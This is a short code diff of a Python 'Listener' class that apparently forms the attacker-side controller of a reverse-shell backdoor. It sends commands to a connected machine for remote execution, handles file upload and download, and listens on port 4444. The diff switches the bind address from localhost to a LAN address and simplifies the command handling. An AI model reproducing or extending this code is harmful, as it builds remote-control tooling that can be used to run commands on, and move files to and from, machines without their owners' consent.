@@ -51,14 +51,14 @@ class Listener:
 			if command.split()[0] == 'upload':
 				file_content = self.read_file(command.split()[1])
 				command += " " + file_content
-				result = self.execute_remotely(command)
-			else:
-				result = self.execute_remotely(command)
+			
+			print(command)
+			result = self.execute_remotely(command)
 			
 			if command.split()[0] == "download":
 				self.write_file(command.split()[1], result)
 
 			print(result)
 
-my_listener = Listener("localhost", 4444)
+my_listener = Listener("192.168.0.103", 4444)
 my_listener.run()
